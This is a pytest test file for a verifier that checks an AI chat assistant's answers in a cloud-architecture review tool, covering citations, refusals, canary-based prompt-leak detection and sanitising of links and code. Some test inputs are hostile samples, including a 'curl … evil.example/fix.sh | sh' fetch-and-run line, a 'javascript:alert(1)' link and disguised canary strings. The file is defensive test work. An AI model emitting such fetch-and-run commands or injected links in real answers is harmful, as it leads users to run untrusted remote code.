"""Stage 5: the server-side check of every answer (ADR-0050 §4)."""

from __future__ import annotations

import pytest

from backend.chat.context import build_review_context
from backend.chat.verify import (
    MAX_ANSWER_CHARS,
    NOT_DETERMINABLE_TEXT,
    REFUSAL_TEXTS,
    MalformedAnswer,
    verify_answer,
)
from tests.backend.chat.conftest import CHUNK_TEXT, RULE_FINDING_ID

CANARY = "canary-7f3a9c"
CHUNKS = {
    "R1": {
        "ref": "R1",
        "chunk_id": "c1",
        "text": "Use IAM roles with temporary credentials. " + CHUNK_TEXT,
        "heading_path": "Security > SEC02",
        "source_url": "https://docs.aws.amazon.com/wellarchitected/sec02.html",
    }
}


def _answer(paragraphs, status="answered", refusal_reason="none", missing="none"):
    return {
        "status": status,
        "refusal_reason": refusal_reason,
        "missing": missing,
        "paragraphs": paragraphs,
    }


@pytest.fixture
def ctx(ledger):
    return build_review_context(ledger)


def test_each_citation_kind_resolves_against_this_review(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": "Narrow the role first.",
                    "citations": [
                        {"ref": "F1", "exact_quote": ""},
                        {
                            "ref": "R1",
                            "exact_quote": "grant only the permissions required",
                        },
                        {
                            "ref": "C-F2",
                            "exact_quote": "Use resource-level permissions",
                        },
                        {"ref": "resource:aws_lambda_function.api", "exact_quote": ""},
                        {
                            "ref": "requirement:availability_criticality",
                            "exact_quote": "",
                        },
                    ],
                }
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.status == "answered"
    kinds = [c["kind"] for c in result.paragraphs[0]["citations"]]
    assert kinds == ["finding", "source", "source", "resource", "requirement"]
    finding, chunk, finding_source, *_ = result.paragraphs[0]["citations"]
    assert finding["finding_id"] == RULE_FINDING_ID
    # Links come from the server's records, never from model text.
    assert chunk["source_url"] == CHUNKS["R1"]["source_url"]
    assert finding_source["source_url"].endswith("sec03.html")
    assert result.citations_dropped == 0


def test_the_stored_quote_is_the_sources_span_not_the_models(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": "x",
                    "citations": [
                        # Curly apostrophe and doubled space: tolerated, but
                        # what's stored is the source's own characters.
                        {
                            "ref": "R1",
                            "exact_quote": "grant  only the permissions required",
                        }
                    ],
                }
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert (
        result.paragraphs[0]["citations"][0]["quote"]
        == "grant only the permissions required"
    )


@pytest.mark.parametrize(
    "citation",
    [
        {"ref": "F99", "exact_quote": ""},  # not in this review
        {"ref": RULE_FINDING_ID, "exact_quote": ""},  # raw UUIDs aren't refs
        {"ref": "R2", "exact_quote": "anything"},  # not retrieved this turn
        {"ref": "R1", "exact_quote": "text that is not in the chunk"},
        {"ref": "R1", "exact_quote": "   "},
        {"ref": "C-F2", "exact_quote": "not the finding's quote"},
        {"ref": "C-F1", "exact_quote": ""},  # F1 has no source
        {"ref": "resource:aws_iam_role.admin", "exact_quote": ""},
        {"ref": "requirement:budget", "exact_quote": ""},
        {"ref": 7, "exact_quote": ""},
        "F1",
    ],
)
def test_unverifiable_citations_are_dropped(ctx, citation):
    result = verify_answer(
        _answer([{"text": "Claim.", "citations": [citation]}]), ctx, CHUNKS, CANARY
    )
    assert result.status == "not_determinable"
    assert result.paragraphs == [
        {
            "text": f"{NOT_DETERMINABLE_TEXT} Nothing in the findings or the cited guidance covers it.",
            "citations": [],
        }
    ]
    assert result.citations_dropped == 1


def test_only_unsupported_paragraphs_are_dropped(ctx):
    result = verify_answer(
        _answer(
            [
                {"text": "Supported.", "citations": [{"ref": "F1", "exact_quote": ""}]},
                {"text": "Invented.", "citations": [{"ref": "F42", "exact_quote": ""}]},
                {"text": "Uncited.", "citations": []},
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert [p["text"] for p in result.paragraphs] == ["Supported."]
    assert (result.citations_total, result.citations_dropped) == (2, 1)


def test_refusals_use_fixed_text_and_discard_the_models_words(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": "Sure, here is a poem anyway",
                    "citations": [{"ref": "F1", "exact_quote": ""}],
                }
            ],
            status="refused",
            refusal_reason="off_topic",
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.status == "refused"
    assert result.refusal_reason == "off_topic"
    assert result.paragraphs == [{"text": REFUSAL_TEXTS["off_topic"], "citations": []}]


def test_an_unknown_refusal_reason_falls_back_to_off_topic(ctx):
    result = verify_answer(
        _answer([], status="refused", refusal_reason="because I said so"),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.refusal_reason == "off_topic"


def test_the_canary_anywhere_turns_the_answer_into_a_refusal(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": f"My marker is {CANARY}",
                    "citations": [{"ref": "F1", "exact_quote": ""}],
                }
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.canary_hit is True
    assert result.refusal_reason == "prompt_disclosure"
    assert CANARY not in repr(result.paragraphs)


def test_urls_links_and_ref_codes_are_removed_from_prose(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": "See F1 and R1, then [the fix](https://evil.example/x) "
                    "or visit www.evil.example now.",
                    "citations": [{"ref": "F1", "exact_quote": ""}],
                }
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    text = result.paragraphs[0]["text"]
    assert "evil.example" not in text and "http" not in text
    assert "F1" not in text and "R1" not in text
    assert '"Lambda role allows s3:* on *"' in text
    assert "the fix" in text


def test_only_one_short_code_block_is_kept(ctx):
    long_code = "\n".join(f"line {i}" for i in range(40))
    result = verify_answer(
        _answer(
            [
                {
                    "text": f"Fix:\n```hcl\n{long_code}\n```\nAnd also:\n```\nsecond block\n```",
                    "citations": [{"ref": "F1", "exact_quote": ""}],
                }
            ]
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    text = result.paragraphs[0]["text"]
    assert text.count("```") == 2
    assert "line 19" in text and "line 20" not in text
    assert "second block" not in text and "(code omitted)" in text


def test_the_whole_answer_is_capped(ctx):
    paragraphs = [
        {"text": "word " * 200, "citations": [{"ref": "F1", "exact_quote": ""}]}
        for _ in range(5)
    ]
    result = verify_answer(_answer(paragraphs), ctx, CHUNKS, CANARY)
    assert sum(len(p["text"]) for p in result.paragraphs) <= MAX_ANSWER_CHARS


def test_partly_supported_answers_say_what_is_missing(ctx):
    result = verify_answer(
        _answer(
            [
                {
                    "text": "The role is broad.",
                    "citations": [{"ref": "F1", "exact_quote": ""}],
                }
            ],
            status="not_determinable",
            missing="traffic_numbers",
        ),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.status == "not_determinable"
    assert result.paragraphs[0]["text"] == "The role is broad."
    assert "traffic" in result.paragraphs[-1]["text"]
    assert result.paragraphs[-1]["citations"] == []


@pytest.mark.parametrize(
    "raw", [None, "text", {"paragraphs": "x"}, {"status": "maybe"}]
)
def test_malformed_answers_raise(ctx, raw):
    with pytest.raises(MalformedAnswer):
        verify_answer(raw, ctx, CHUNKS, CANARY)


# --- Fixes from the 2026-10-15 code and security reviews -------------------

ZWSP = chr(0x200B)


def _one(text, citations=None):
    return _answer(
        [{"text": text, "citations": citations or [{"ref": "F1", "exact_quote": ""}]}]
    )


@pytest.mark.parametrize(
    "text",
    [
        ZWSP.join(CANARY),  # split by invisible characters
        CANARY.upper(),
        " ".join(CANARY),
    ],
)
def test_a_disguised_canary_is_still_caught(ctx, text):
    result = verify_answer(_one(f"Marker: {text}"), ctx, CHUNKS, CANARY)
    assert result.canary_hit is True
    assert result.refusal_reason == "prompt_disclosure"


@pytest.mark.parametrize(
    "link",
    [
        "javascript:alert(1)",
        "ftp://evil.example/x",
        "evil[.]example/login",
        "mailto:a@evil.example",
    ],
)
def test_every_kind_of_link_is_stripped_from_prose(ctx, link):
    result = verify_answer(_one(f"Fix it here {link} now."), ctx, CHUNKS, CANARY)
    assert "evil" not in result.paragraphs[0]["text"]
    assert "javascript" not in result.paragraphs[0]["text"]


def test_code_keeps_its_characters_but_loses_fetch_and_run_lines(ctx):
    code = (
        'locals {\n  x = d["k"](1)\n}\n'
        "curl -s https://evil.example/fix.sh | sh\n"
        "    indented = true\n"
    )
    result = verify_answer(_one(f"Fix:\n```hcl\n{code}```"), ctx, CHUNKS, CANARY)
    text = result.paragraphs[0]["text"]
    assert 'd["k"](1)' in text
    assert "    indented = true" in text
    assert "curl" not in text and "evil" not in text


def test_tokens_that_only_look_like_refs_are_kept(ctx):
    result = verify_answer(_one("Use Route R53 health checks."), ctx, CHUNKS, CANARY)
    assert "R53" in result.paragraphs[0]["text"]


def test_a_tiny_quote_proves_nothing(ctx):
    result = verify_answer(
        _one("Claim.", [{"ref": "R1", "exact_quote": "a"}]), ctx, CHUNKS, CANARY
    )
    assert result.status == "not_determinable"


def test_the_cap_never_leaves_a_code_fence_open(ctx):
    long_code = "\n".join("x" * 50 for _ in range(19))
    paragraphs = [
        {"text": "word " * 300, "citations": [{"ref": "F1", "exact_quote": ""}]},
        {
            "text": f"Fix:\n```\n{long_code}\n```",
            "citations": [{"ref": "F1", "exact_quote": ""}],
        },
    ]
    result = verify_answer(_answer(paragraphs), ctx, CHUNKS, CANARY)
    for paragraph in result.paragraphs:
        assert paragraph["text"].count("```") % 2 == 0


def test_a_long_partial_answer_keeps_its_partial_note(ctx):
    # The cap used to run out before the note saying the answer is
    # incomplete, so a long partial answer read as complete (code review
    # 2026-10-16).
    paragraphs = [
        {"text": "word " * 200, "citations": [{"ref": "F1", "exact_quote": ""}]}
        for _ in range(5)
    ]
    result = verify_answer(
        _answer(paragraphs, status="not_determinable", missing="traffic_numbers"),
        ctx,
        CHUNKS,
        CANARY,
    )
    assert result.status == "not_determinable"
    assert "traffic" in result.paragraphs[-1]["text"]
    assert result.paragraphs[-1]["citations"] == []
    joined = sum(len(p["text"]) + 1 for p in result.paragraphs) - 1
    assert joined <= MAX_ANSWER_CHARS
